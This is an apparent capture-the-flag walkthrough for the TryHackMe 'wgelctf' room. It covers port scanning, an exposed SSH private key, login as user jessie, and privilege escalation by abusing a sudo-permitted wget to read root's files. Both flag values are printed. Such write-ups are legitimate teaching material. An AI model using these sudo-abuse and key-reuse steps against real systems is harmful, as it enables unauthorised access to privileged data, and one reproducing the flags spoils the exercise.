@@ -1,0 +1,94 @@
+So today we are going to solve another challenge from Tryhackme which is listed as Easy and it is wgelctf.'
+
+Main IP :: 10.49.159.19
+
+Starting with full port scan.
+
+Host is up (0.00026s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Found this let's check for service and versions of it.
+
+Nmap scan report for 10.49.159.19
+Host is up, received reset ttl 64 (0.00073s latency).
+Scanned at 2026-05-19 06:33:28 BST for 7s
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
+|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
+|   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+So will move with port 80 and look for what is on the webserver.
+
+nothing just an ubuntu apache server default page.
+
+let's start with fuzzing and directory scan,
+
+                                                                    ==> DIRECTORY: http://10.49.159.19/sitemap/.ssh/
+                                                                    ==> DIRECTORY: http://10.49.159.19/sitemap/css/
+                                                                    ==> DIRECTORY: http://10.49.159.19/sitemap/fonts/
+                                                                    ==> DIRECTORY: http://10.49.159.19/sitemap/images/
+
+so found this and also an id_rsa file
+
+Also reading the view-source:http://10.49.159.19/
+will get the username and we can log into the machine 
+
+ <!-- Jessie don't forget to udate the webiste -->
+
+so now we are into the ssh
+~/Documents$ ls
+user_flag.txt
+jessie@CorpOne:~/Documents$ cat user_flag.txt 
+057c67131c3d5e42dd5cd3075b198ff6
+jessie@CorpOne:~/Documents$ 
+
+
+PRIVILEDGE ESCALATION:
+
+https://gtfobins.org/gtfobins/wget/#shell can help you also 
+
+Comment
+The file to be read is treated as a list of URLs, one per line, which are actually fetched by wget. The content appears, somewhat modified, as error messages.
+
+Unprivileged
+Sudo
+This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped.
+
+Remarks
+If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ....
+
+wget -i /path/to/input-file
+SUID
+Remarks
+The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.
+
+~/Documents$ sudo -l
+Matching Defaults entries for jessie on CorpOne:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jessie may run the following commands on CorpOne:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget
+jessie@CorpOne:~/Documents$ sudo /usr/bin/wget -i /root/root.txt
+/root/root.txt: No such file or directory
+No URLs found in /root/root.txt.
+jessie@CorpOne:~/Documents$ sudo /usr/bin/wget -i /root/root_flag.txt
+--2026-05-19 08:54:54--  http://b1b968b37519ad1daa6408188649263d/
+Resolving b1b968b37519ad1daa6408188649263d (b1b968b37519ad1daa6408188649263d)... failed: Name or service not known.
+wget: unable to resolve host address ‘b1b968b37519ad1daa6408188649263d’
